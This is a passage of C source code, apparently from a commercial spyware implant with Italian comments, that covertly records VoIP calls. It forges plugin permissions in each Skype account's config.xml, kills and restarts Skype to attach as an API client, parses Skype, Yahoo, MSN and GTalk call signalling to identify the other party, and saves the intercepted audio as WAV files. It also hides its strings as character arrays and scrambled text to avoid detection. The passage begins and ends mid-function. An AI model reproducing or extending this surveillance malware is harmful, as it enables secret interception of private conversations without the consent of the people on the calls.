	DWORD len, first;

	ZeroMemory(user_name, size);
	_snwprintf_s(user_name, size/sizeof(WCHAR), _TRUNCATE, L"%s", path); 
	ptr = wcsstr(user_name, L"#3a");
	if (!ptr)
		return;
	
	len = wcslen(user_name)*sizeof(WCHAR);
	first = (DWORD)ptr - (DWORD)user_name;
	*ptr = L':';

	memcpy(ptr+1, ptr+3, len-first-4);
}

// Inserisce i permessi corretti per potersi attaccare a skype come plugin
void CheckSkypePluginPermissions(DWORD skype_pid, WCHAR *skype_path)
{
	WCHAR skype_data[MAX_PATH];
	WCHAR skype_search[MAX_PATH];
	WCHAR config_path[MAX_PATH];
	WCHAR core_path[MAX_PATH];
	char skype_exe_path[MAX_PATH];
	WIN32_FIND_DATAW find_data;
	HANDLE hFind, hSkype, hFile;
	BOOL is_to_respawn = FALSE;
	char m_key1[MAX_HASHKEY_LEN], m_key2[MAX_HASHKEY_LEN], m_key3[MAX_HASHKEY_LEN], m_key4[MAX_HASHKEY_LEN], m_key5[MAX_HASHKEY_LEN], m_key6[MAX_HASHKEY_LEN], m_path[MAX_HASHKEY_LEN];
	BOOL isOld;
	WCHAR skype_user_name[MAX_PATH];

	// Trova il path di %appdata%\Skype
	if(!FNC(GetEnvironmentVariableW)(L"appdata", skype_data, MAX_PATH)) 
		return;
	wcscat_s(skype_data, MAX_PATH, L"\\Skype\\");
	_snwprintf_s(skype_search, sizeof(skype_search)/sizeof(WCHAR), _TRUNCATE, L"%s\\*", skype_data); 
	_snprintf_s(skype_exe_path, sizeof(skype_exe_path), _TRUNCATE, "%S\\Phone\\Skype.exe /nosplash /minimized", skype_path); 
	if (GetModuleFileNameW(NULL, core_path, MAX_PATH) == 0)
		return;

	// Cicla tutte le directory degli account
	hFind = FNC(FindFirstFileW)(skype_search, &find_data);
	if (hFind == INVALID_HANDLE_VALUE)
		return;
	do {
		if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (find_data.cFileName[0] == L'.')
				continue;
			// Verifica che sia realmente un utente
			_snwprintf_s(config_path, sizeof(config_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\%s\\config.xml", skype_data, find_data.cFileName); 
			if ((hFile = FNC(CreateFileW)(config_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE)
				continue;
			CloseHandle(hFile);
			// Verifica se contiene gia' la permission altrimenti la scrive
			isOld = IsOldSkypeVersion(config_path);			
			SKypeNameConvert(find_data.cFileName, skype_user_name, sizeof(skype_user_name));
			if (FindHashKeys(skype_user_name, core_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld))
				if (!IsACLPresent(config_path, m_key1, m_key2, m_key3, m_key4, m_path))
					if (WriteSkypeACL(config_path, m_key1, m_key2, m_key3, m_key4, m_key5, m_key6, m_path, isOld)) 
						is_to_respawn = TRUE;
		}
	} while (FNC(FindNextFileW)(hFind, &find_data));
	FNC(FindClose)(hFind);

	// Se ne scrive almeno una, killa e respawna skype
	if (is_to_respawn) {
		if (hSkype = FNC(OpenProcess)(PROCESS_TERMINATE, FALSE, skype_pid)) {
			STARTUPINFO si;
			PROCESS_INFORMATION pi;

			TerminateProcess(hSkype, 0);
			CloseHandle(hSkype);
			ZeroMemory( &si, sizeof(si) );
		    si.cb = sizeof(si);
			Sleep(1000); // Da' un po' di tempo per killare il processo
			//si.wShowWindow = SW_SHOW;
			//si.dwFlags = STARTF_USESHOWWINDOW;
			StartSkypeAsUser(skype_exe_path, &si, &pi);
		}
	}
}

// Monitora costantemente la possibilita' di attaccarsi come API client a Skype
DWORD WINAPI MonitorSkypePM(BOOL *semaphore)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	DWORD skipe_id;
	HANDLE skype_handle;
	WCHAR skype_path[MAX_PATH];
	WCHAR *skype_pm_ptr;
	WCHAR skype_pm_path[MAX_PATH];

	LOOP {
		for (DWORD i=0; i<9; i++) {
			CANCELLATION_POINT((*semaphore));
			Sleep(250);
		}

		// Cerca il path di skypepm partendo da quello di skype.exe
		// e lo esegue
		if ( (skipe_id = HM_FindPid("skype.exe", TRUE)) ) {
			if ( (skype_handle = FNC(OpenProcess)(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, skipe_id)) ) {
				if (FNC(GetModuleFileNameExW)(skype_handle, NULL, skype_path, (sizeof(skype_path)/sizeof(WCHAR))-1)) {
					if (skype_pm_ptr = wcsstr(skype_path, L"\\Phone\\")) {
						*skype_pm_ptr = 0;
						_snwprintf_s(skype_pm_path, sizeof(skype_pm_path)/sizeof(WCHAR), _TRUNCATE, L"%s\\Plugin Manager\\skypePM.exe", skype_path);		
						// Vede se esiste il file
						HANDLE	fileh = FNC(CreateFileW)(skype_pm_path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
						if (fileh != INVALID_HANDLE_VALUE)
							CloseHandle(fileh);
						else  {// Non c'e' lo skypePM quindi cerca di fare l'attach al processo
							// Prima di cercare di fare l'attach controlla che ci siano i giusti permessi...
							EnterCriticalSection(&skype_critic_sec);
							CheckSkypePluginPermissions(skipe_id, skype_path);
							LeaveCriticalSection(&skype_critic_sec);
							UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
							HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
						}
					}
				}
				CloseHandle(skype_handle);
			}
		}
	}
	return 0;
}

BOOL ParseMsnMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
{	
	char *ptr = NULL, *tmp = NULL, *MsnID = NULL;
	char space[] = { ' ', 0};
	char separator[] = { ';', '{', 0};
		
	if (*pdwFlags & FLAGS_MSN_OUT) {
		NullTerminatePacket(*pdwLen, msg);
		
		// Cerchiamo il primo spazio e spostiamoci avanti
		if(ptr = strstr((char *)msg, space))
			ptr++;
		else
			return TRUE;

		// Facciamo la stessa cosa col secondo spazio
		if(ptr && (ptr = strstr((char *)ptr, space)))
			ptr++;
		else
			return TRUE;

		// Terminiamo al terzo spazio
		if(ptr && (tmp = strstr((char *)ptr, space)))
			*tmp = 0;
		else
			return TRUE;

		if(ptr == NULL)
			return TRUE;

		MsnID = strdup(ptr);
	}

	// Se ha trovato un nuovo interlocutore
	if (MsnID) {
		// Toglie l'uid
		ptr = strstr(MsnID, separator);
		if (ptr)
			*ptr = 0;

		if (call_list_head==NULL || call_list_head->peer==NULL || strcmp(call_list_head->peer, MsnID)) {
			EndCall();
			FreePartnerList(&call_list_head);
			// Alloca il nuovo interlocutore
			if ( (call_list_head = (partner_entry *)calloc(sizeof(partner_entry), 1)) )  {
				call_list_head->peer = MsnID;
				call_list_head->voip_program = VOIP_MSMSG;
			}
		}
	}

	if ((*pdwFlags & FLAGS_MSN_IN) || (*pdwFlags & FLAGS_MSN_OUT)) 
		return TRUE;

	// Se e' una chiamata VOIP_MSMSG, ma riceve chunk da wasapi, la trasforma in VOIP_MSMSG per
	// far accettare i chunk
	if ( (((*pdwFlags)>>24) & 0x3F) == VOIP_MSNWS && call_list_head && 
		(call_list_head->voip_program == VOIP_MSMSG))
		call_list_head->voip_program = VOIP_MSNWS;

	return FALSE;
}

BOOL ParseGtalkMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
{	
	char *ptr = NULL, *tmp_ptr = NULL;
	char *GTID = NULL;

/*	if (*pdwFlags & FLAGS_GTALK_IN) {
		NullTerminatePacket(*pdwLen, msg);
		if ( (ptr = strchr((char *)msg, '>')) && !strncmp(++ptr, "<session ", strlen("<session ")) && (tmp_ptr = strchr(ptr, '>')) ) {
			*tmp_ptr = 0;
			// E' un pacchetto di accept per una chiamata iniziata da noi
			if ( strstr(ptr, "type=\"accept\"") && (ptr = strstr((char *)msg, "from=\"")) ) {
				ptr+=strlen("from=\"");
				if ( (tmp_ptr = strchr(ptr, '/')) )
					*tmp_ptr = 0;
				GTID = strdup(ptr);			
			} else if ( strstr(ptr, "type=\"terminate\"") ) {
				// E' un pacchetto di terminate
				EndCall();
				FreePartnerList(&call_list_head);
			}	
		}
	}

	if (*pdwFlags & FLAGS_GTALK_OUT) {
		NullTerminatePacket(*pdwLen, msg);
		// E' un pacchetto di accept per una chiamata iniziata da noi
		if ( (ptr = strchr((char *)msg, '>')) && !strncmp(++ptr, "<session ", strlen("<session ")) && (tmp_ptr = strchr(ptr, '>')) ) {
			*tmp_ptr = 0;
			if ( strstr(ptr, "type=\"accept\"") && (ptr = strstr((char *)msg, "to=\"")) ) {
				ptr+=strlen("to=\"");
				if ( (tmp_ptr = strchr(ptr, '/')) )
					*tmp_ptr = 0;
				GTID = strdup(ptr);			
			} else if ( strstr(ptr, "type=\"terminate\"") ) {
				// E' un pacchetto di terminate
				EndCall();
				FreePartnerList(&call_list_head);
			}
		}
	}

	// Se ha trovato un nuovo interlocutore
	if (GTID) {
		EndCall();
		FreePartnerList(&call_list_head);
		// Alloca il nuovo interlocutore
		if ( (call_list_head = (partner_entry *)calloc(sizeof(partner_entry), 1)) )  {
			//Log_Sanitize(GTID);
			call_list_head->peer = GTID;
			call_list_head->voip_program = VOIP_GTALK;
		}
	}
	*/
	if ((*pdwFlags & FLAGS_GTALK_IN) || (*pdwFlags & FLAGS_GTALK_OUT)) 
		return TRUE;

	return FALSE;
}

BOOL ParseYahooMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
{	
	char *ptr = NULL, *tmp = NULL;
	BOOL is_interesting = FALSE;
	char YID[64];
	char invite[10];
	DWORD seq = 0xfffffff;
	char sip_tag[] = { 'S', 'I', 'P', '/', '2', '.', '0', ' ', '2', '0', '0', ' ', 'O', 'K', 0x0 }; //"SIP/2.0 200 OK"
	char to_tag[] = { 'T', 'o', ':', ' ', 0x0 }; //"To: "
	char to_sip[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', 0x0 }; //"To: <sip:"
	char to_sip_format[] = { 'T', 'o', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"To: <sip:%63s"
	char minus_sip[] = { '<', 's', 'i', 'p', 0x0 }; //"<sip"
	char from_tag[] = { 'F', 'r', 'o', 'm', ':', ' ', 0x0 }; //"From: "
	char from_sip[] = { 'F', 'r', 'o', 'm', ':', ' ', '<', 's', 'i', 'p', ':', 0x0 }; //"From: <sip:"
	char from_sip_format[] = { 'F', 'r', 'o', 'm', ':', ' ', '<', 's', 'i', 'p', ':', '%', '6', '3', 's', 0x0 }; //"From: <sip:%63s"
	char call_id_tag[] = { 'C', 'a', 'l', 'l', '-', 'I', 'D', ':', ' ', 0x0 }; //"Call-ID: "
	char call_seq_tag[] = { 'C', 'S', 'e', 'q', ':', ' ', 0x0 }; //"CSeq: "

	char to_format[] = { 'T', 'o', ':', ' ', '%', '6', '3', 's', 0x0 }; //"To: %63s"
	char from_format[] = { 'F', 'r', 'o', 'm', ':', ' ', '%', '6', '3', 's', 0x0 }; //"From: %63s"

	if (*pdwFlags & FLAGS_YMSG_IN) {
		// Nuova chiamata
		NullTerminatePacket(*pdwLen, msg);
		if ( ptr = strstr((char *)msg, sip_tag) ) {
			if (ptr = strstr(ptr, to_tag)) {
				ZeroMemory(YID, sizeof(YID));
				// Cerca il nome del peer se la chiamata e' iniziata da locale
				if (!strncmp(ptr, to_sip, strlen(to_sip))) {
					sscanf(ptr, to_sip_format, YID);
					if(tmp = strstr(YID, "@"))
						tmp[0] = 0;
				} else {
					sscanf(ptr, to_format, YID);
					if(tmp = strstr(YID, minus_sip))
						tmp[0] = 0;
				}
				is_interesting = TRUE;
			}
		}
	}

	if (*pdwFlags & FLAGS_YMSG_OUT) {
		// Nuova chiamata
		NullTerminatePacket(*pdwLen, msg);
		if ( ptr = strstr((char *)msg, sip_tag) ) {
			if (ptr = strstr(ptr, from_tag)) {
				ZeroMemory(YID, sizeof(YID));
				// Cerca il nome del peer se la chiamata e' iniziata da remoto
				if (!strncmp(ptr, from_sip, strlen(from_sip))) {
					sscanf(ptr, from_sip_format, YID);
					if(tmp = strstr(YID, "@"))
						tmp[0] = 0;
				} else {
					sscanf(ptr, from_format, YID);
					if(tmp = strstr(YID, minus_sip))
						tmp[0] = 0;
				}
				is_interesting = TRUE;
			}
		}
	}

	// Qui abbiamo gia' parsato l'eventuale destinatario del messaggio
	// Ora vediamo se e' un inizio o fine chiamata. Se non trova il destinatario
	// questa parte non e' "interesting"
	if (is_interesting && ptr) {
		if (strstr(ptr, call_id_tag) && (ptr = strstr((char *)msg, call_seq_tag))) {
			sscanf(ptr, "CSeq: %d %6s", &seq, invite);
			// Comincia la registrazione se e' una nuova chiamata o se e' stato fatto il resume di una
			// chiamata messa precedentemente in hold
			if(!strncmp(invite, "INVITE", 6) && (strstr(ptr, "a=sendrecv") || strstr(ptr, "s=Yahoo Voice"))&& seq != 0xfffffff) {
				// flusha la chiamata e libera la lista degli interlocutori 
				// (in questo caso e' uno soltanto).
				EndCall();
				FreePartnerList(&call_list_head);

				// Alloca il nuovo interlocutore
				if ( !(call_list_head = (partner_entry *)calloc(sizeof(partner_entry), 1)) ) 
					return TRUE;
				//Log_Sanitize(YID);
				call_list_head->peer = strdup(YID);
				call_list_head->voip_program = VOIP_YAHOO;

			// Termina la chiamata 
			} else if(!strncmp(invite, "BYE", 3) && seq != 0xffffffff) {
				// flusha la chiamata e libera la lista degli interlocutori 
				// (in questo caso e' uno soltanto).
				EndCall();
				FreePartnerList(&call_list_head);
			}
		}
	}

	if ((*pdwFlags & FLAGS_YMSG_IN) || (*pdwFlags & FLAGS_YMSG_OUT)) 
		return TRUE;

	return FALSE;
}

BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
{
	COPYDATASTRUCT cd_struct;
	DWORD call_id;
	char req_buf[256];

	char id_num[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', 0x0 }; //"#14113009"
	char partner_h_id[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'P', 'A', 'R', 'T', 'N', 'E', 'R', '_', 'H', 'A', 'N', 'D', 'L', 'E', ' ', '%', 's', 0x0 }; //"#14113009 CALL %d PARTNER_HANDLE %s"
	char id_local_hold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'L', 'O', 'C', 'A', 'L', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS LOCALHOLD"
	char id_remotehold[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'E', 'M', 'O', 'T', 'E', 'H', 'O', 'L', 'D', 0x0 }; //"STATUS REMOTEHOLD"
	char id_finished[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'F', 'I', 'N', 'I', 'S', 'H', 'E', 'D', 0x0 }; //"STATUS FINISHED"
	
	char id_unplaced[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'U', 'N', 'P', 'L', 'A', 'C', 'E', 'D', 0x0 }; //"STATUS INPROGRESS"
	char id_unplaced_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'U', 'N', 'P', 'L', 'A', 'C', 'E', 'D', 0x0 }; //"CALL %d STATUS INPROGRESS"

	char id_ringing[] = { 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'I', 'N', 'G', 'I', 'N', 'G', 0x0 }; //"STATUS INPROGRESS"
	char id_ringing_format[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', 'R', 'I', 'N', 'G', 'I', 'N', 'G', 0x0 }; //"CALL %d STATUS INPROGRESS"

	char id_partic_count[] = { 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"CONF_PARTICIPANTS_COUNT"
	char format_partner_handle[] = { '#', '1', '4', '1', '1', '3', '0', '0', '9', ' ', 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'P', 'A', 'R', 'T', 'N', 'E', 'R', '_', 'H', 'A', 'N', 'D', 'L', 'E', 0x0 }; //"#14113009 GET CALL %d PARTNER_HANDLE"
	char format_conf_part[] = { 'G', 'E', 'T', ' ', 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', 0x0 }; //"GET CALL %d CONF_PARTICIPANTS_COUNT"
	char format_call_stat[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'S', 'T', 'A', 'T', 'U', 'S', ' ', '%', 's', 0x0 }; //"CALL %d STATUS %s"
	char format_call_part[] = { 'C', 'A', 'L', 'L', ' ', '%', 'd', ' ', 'C', 'O', 'N', 'F', '_', 'P', 'A', 'R', 'T', 'I', 'C', 'I', 'P', 'A', 'N', 'T', 'S', '_', 'C', 'O', 'U', 'N', 'T', ' ', '%', 'd', 0x0 }; //"CALL %d CONF_PARTICIPANTS_COUNT %d"

	char string_obfs[] = { '_', ' ', 'O', 'E', 'P', 'U', 'v', 'E', 't', 'U', 'P', 'C', ' ', 'X', 'Q', 'y', 'c', ' ', 'H', 'd', 'l', 'd', 'l', '1', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', '.', 'Q', 'M', 0x0d, 0x0a, 0x0}; // "_ OEPUvEtUPC XQyc Hdldl1.............QM\r\n"

	if (*pdwFlags & FLAGS_SKAPI_MSG) {

		NullTerminatePacket(*pdwLen, msg);
		if (!strncmp((char *)msg, id_num, 9)) {

			// Skype ha risposto alle nostre richieste dicendo chi e' l'interlocutore
			// per questa chiamata
			partner_entry *curr_partner;
			char *partner_handle;

			if (! (partner_handle = (char *)calloc(strlen((char *)msg), sizeof(char))) )
				return TRUE;
			sscanf((char *)msg, partner_h_id, &call_id, partner_handle);
			//Log_Sanitize(partner_handle);

			// vede se abbiamo gia' in lista questa chiamata
			for (curr_partner = call_list_head; curr_partner; curr_partner=curr_partner->next) 
				if (curr_partner->Id == call_id) {
					SAFE_FREE(partner_handle);
					return TRUE;
				}

			// Se nella lista c'e' un interlocutore non Skype, azzera la lista
			for (curr_partner = call_list_head; curr_partner; curr_partner=curr_partner->next) 
				if (curr_partner->voip_program != VOIP_SKYPE && curr_partner->voip_program != VOIP_SKWSA) {
					FreePartnerList(&call_list_head);
					break;
				}

			// Se non e' presente lo inseriamo in testa
			if ( !(curr_partner = (partner_entry *)malloc(sizeof(partner_entry))) ) {
				SAFE_FREE(partner_handle);
				return TRUE;
			}

			EndCall(); // E' cambiata la lista degli interlocutori, quindi
			           // forza il salvataggio della chiamata
			curr_partner->next = call_list_head;
			curr_partner->Id = call_id;
			curr_partner->participants = 0;
			curr_partner->peer = partner_handle;
			curr_partner->flags = 0;
			curr_partner->voip_program = VOIP_SKYPE;
			call_list_head = curr_partner;
		} else if (strstr((char *)msg, id_unplaced) && skype_api_wnd) {
			DWORD dummy;

			// Riceve l'avviso di chiamata in progress e richiede chi e' l'interlocutore
			sscanf((char *)msg, id_unplaced_format, &call_id);
			sprintf(req_buf, format_partner_handle, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
			// e chiede anche quanti sono a partecipare alla chiamata (in remoto)
			sprintf(req_buf, format_conf_part, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);

			// Termina ogni chiamata esistente 
			EndCall();
			FreePartnerList(&call_list_head);

		} else if (strstr((char *)msg, id_ringing) && skype_api_wnd) {
			DWORD dummy;

			// Riceve l'avviso di chiamata in progress e richiede chi e' l'interlocutore
			sscanf((char *)msg, id_ringing_format, &call_id);
			sprintf(req_buf, format_partner_handle, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
			// e chiede anche quanti sono a partecipare alla chiamata (in remoto)
			sprintf(req_buf, format_conf_part, call_id);
			cd_struct.dwData = 0;
			cd_struct.lpData = req_buf;
			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);

			// Termina ogni chiamata esistente 
			EndCall();
			FreePartnerList(&call_list_head);

		} else if (strstr((char *)msg, id_local_hold) || strstr((char *)msg, id_remotehold) || strstr((char *)msg, id_finished)) {
			// Una chiamata e' stata terminata o messa in attesa
			partner_entry **curr_partner, *tmp_partner;
			sscanf((char *)msg, format_call_stat, &call_id, req_buf);
			
			for (curr_partner = &call_list_head; *curr_partner; curr_partner=&((*curr_partner)->next)) 
				if ((*curr_partner)->Id == call_id) {
					EndCall(); // E' cambiata la lista degli interlocutori, quindi
			                   // forza il salvataggio della chiamata
					// Togliamo un elemento dalla lista degli interlocutori
					SAFE_FREE( (*curr_partner)->peer );
					tmp_partner = *curr_partner;
					*curr_partner = (*curr_partner)->next;
					SAFE_FREE(tmp_partner);
					break;
				}
		} else if (strstr((char *)msg, id_partic_count)) {
			// Skype ci ha risposto dicendo quante persone stanno partecipando a una chiamata (da remoto)
			
			DWORD participant_count;
			partner_entry *curr_partner;
			sscanf((char *)msg, format_call_part, &call_id, &participant_count);
			for (curr_partner = call_list_head; curr_partner; curr_partner=curr_partner->next) 
				if (curr_partner->Id == call_id) {
					if (participant_count > 0)
						curr_partner->participants = participant_count-1;
					else
						curr_partner->participants = 0;
					break;
				}
		}
		return TRUE;
	}
	if (*pdwFlags & FLAGS_SKAPI_WND) {
		ScrambleString ss(string_obfs, is_demo_version); // "- Monitoring VOIP queues.............OK\r\n"
		REPORT_STATUS_LOG(ss.get_str());
		skype_api_wnd = *((HWND *)msg);
		return TRUE;
	}
	if (*pdwFlags & FLAGS_SKAPI_SWD) {
		skype_pm_wnd = *((HWND *)msg);
		return TRUE;
	}
	if (*pdwFlags & FLAGS_SKAPI_INI) {
		// Skype e' ripartito. Salviamo eventuali code e azzeriamo la lista 
		// dei partner
		EndCall();
		FreePartnerList(&call_list_head);
		return TRUE;
	}

	// Se abbiamo ricevuto un chunk audio tramite wsawrite o DirectSound, marca la chiamata come "old style"
	if ( (((*pdwFlags)>>24) & 0x3F) == VOIP_SKYPE && call_list_head && 
		(call_list_head->voip_program == VOIP_SKYPE || call_list_head->voip_program == VOIP_SKWSA)) {
		call_list_head->voip_program = VOIP_SKYPE;
		call_list_head->flags = CALL_SKYPE_OLD;
	}

	// Al primo chunk audio che riceve come SKYPE WASAPI cambia il voip program nella lista
	// dei peer, cosi' i chunk verranno accettati correttamente e nel file verra scritto il giusto
	// sample rate. Lo fa solo se non e' una chiamata "old style"
	if ( (((*pdwFlags)>>24) & 0x3F) == VOIP_SKWSA && call_list_head && 
		(call_list_head->voip_program == VOIP_SKYPE) && !(call_list_head->flags&CALL_SKYPE_OLD))
		call_list_head->voip_program = VOIP_SKWSA;

	return FALSE;
}


BOOL ParseSamplingMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
{
	DWORD in_out = INPUT_ELEM;
	if (*pdwFlags & FLAGS_SAMPLING) {

		if (*pdwFlags & FLAGS_OUTPUT)
			in_out = OUTPUT_ELEM;

		sample_sampling[in_out] = *((DWORD *)msg);
		return TRUE;
	}

	return FALSE;
}

DWORD __stdcall PM_VoipRecordDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
{
	DWORD in_out = INPUT_ELEM;
	pVoiceAdditionalData additional_data;
	DWORD additional_len;

	// Se il monitor e' stoppato non esegue la funzione di dispatch
	if (!bPM_VoipRecordStarted)
		return 0;

	// Parsing per messaggi specifici di un programma
	if (ParseSkypeMsg(msg, &dwLen, &dwFlags))
		return 1;
	if (ParseYahooMsg(msg, &dwLen, &dwFlags))
		return 1;
	if (ParseGtalkMsg(msg, &dwLen, &dwFlags))
		return 1;
	if (ParseMsnMsg(msg, &dwLen, &dwFlags))
		return 1;
		
	// Intercetta i messaggi di sampling rate
	if (ParseSamplingMsg(msg, &dwLen, &dwFlags))
		return 1;
		
	// Registra solo se ci sono chiamate in corso
	if (!call_list_head)
		return 1;

	// Verifica che il chunk audio appartenga effettivamente al programma che viene usato verso il
	// primo elemento della lista dei peer 
	if (call_list_head->voip_program != ((dwFlags>>24) & 0x3F))
		return 1;

	// Se non e' un messaggio di CallID allora determina da dove viene il sample
	if (dwFlags & FLAGS_OUTPUT)
		in_out = OUTPUT_ELEM; // Di default e' su INPUT_ELEM

	// Se e' troppo distante dall'ultimo sample, lo salva in un file differente
	// differente (appartiene a una chiamata diversa).
	// Se sample size e' > 0 sono sicuro che channel_time_last sia stato valorizzato
	if (sample_size[in_out]>0 && abs(TimeDiff(time_nanosec, &channel_time_last[in_out])) > CALL_DELTA) {
		additional_data = VoipGetAdditionalData(call_list_head, in_out, &additional_len);
		SaveWav(wave_array[in_out], sample_size[in_out], sample_channels[in_out], additional_data, additional_len);
		sample_size[in_out] = 0;
	}

	// Se e' il primo messaggio che stiamo mettendo su quel canale, 
	// lo prendiamo come timestamp di inizio (approssimativamente)
	if (sample_size[in_out] == 0) {
		channel_time_start[in_out].dwHighDateTime = time_nanosec->dwHighDateTime;
		channel_time_start[in_out].dwLowDateTime = time_nanosec->dwLowDateTime;
	}
	// Setta l'ultimo time-stamp
	channel_time_last[in_out].dwHighDateTime = time_nanosec->dwHighDateTime;
	channel_time_last[in_out].dwLowDateTime = time_nanosec->dwLowDateTime;

	// Lo inserisce nella lista 
	if (InsertList(wave_array[in_out], msg, dwLen, sample_size[in_out])) {
		sample_size[in_out] += dwLen;
		sample_channels[in_out] = (dwFlags>>30);
	}

	// Se ha superato la dimensione del sample, salva su file
	// e libera la lista
	if (sample_size[in_out] > max_sample_size) {
		additional_data = VoipGetAdditionalData(call_list_head, in_out, &additional_len);
		SaveWav(wave_array[in_out], sample_size[in_out], sample_channels[in_out], additional_data, additional_len);
		sample_size[in_out] = 0;
	}

	return 1;
}


DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset)
{
	char codec_path[DLLNAMELEN];
	pVoiceAdditionalData additional_data;
	DWORD additional_len;

	// Lo fa per prima cosa, anche se e' gia' in quello stato
	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
	// che li mette in stop non verrebbero fermati realmente a causa del check
	// if (bPM_KeyLogStarted == bStartFlag) che considera suspended e stopped uguali.
	// Gli agenti IPC non vengono stoppati quando in suspend (cosi' cmq mettono in coda
	// durante la sync).
	if (bReset)
		AM_IPCAgentStartStop(PM_VOIPRECORDAGENT, bStartFlag);

	// Se l'agent e' gia' nella condizione desiderata
	// non fa nulla.
	if (bPM_VoipRecordStarted == bStartFlag)
		return 0;

	// Allo start vede se non abbiamo ancora il codec caricato
	// Se manca, cerca di caricarlo.
	if (bStartFlag && !codec_handle)
		codec_handle = ResolveCodecSymbols(HM_CompletePath(H4_CODEC_NAME, codec_path));
	
	// Cambia lo stato dell'agente
	bPM_VoipRecordStarted = bStartFlag;

	// Quando stoppiamo l'agente flusha le due code di PCM...
	if (!bStartFlag) {
		for (DWORD i=0; i<2; i++) {
			if (sample_size[i]>0) {
				additional_data = VoipGetAdditionalData(call_list_head, i, &additional_len);
				SaveWav(wave_array[i], sample_size[i], sample_channels[i], additional_data, additional_len);
				sample_size[i] = 0;
			}
		}
		// ... e stoppiamo il thread che monitora lo skypePM
		QUERY_CANCELLATION(hSkypePMThread, bPM_spmcp);
	} else { // bStartFlag == TRUE
		DWORD dummy;
		// Startiamo il thread che monitora lo skypePM
		hSkypePMThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorSkypePM, (DWORD *)&bPM_spmcp, 0, 0);
	}

	return 1;
}


DWORD __stdcall PM_VoipRecordInit(JSONObject elem)
{
	// Inizializza la dimensione dei sample su disco
	// e il fattore di compressione
	max_sample_size = (DWORD) elem[L"buffer"]->AsNumber();
	compress_factor = (DWORD) elem[L"compression"]->AsNumber();

	// Riallochiamo l'array per i PCM
	// Siamo sicuri di non perdere dati, perche' la Init viene fatta sempre dopo lo Stop
	// Che avra' flushato entrambe le code e in questo momento il thread di dispatch e' ancora fermo
	SAFE_FREE(wave_array[INPUT_ELEM]);
	SAFE_FREE(wave_array[OUTPUT_ELEM]);
	wave_array[INPUT_ELEM]  = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
	wave_array[OUTPUT_ELEM] = (BYTE *)malloc(max_sample_size + MAX_MSG_LEN * 2);
	return 1;
}

DWORD __stdcall PM_VoipRecordUnregister()
{
#define MAX_FREE_TRIES 5
#define FREE_SLEEP_TIME 100
	DWORD i;
	if (codec_handle) {
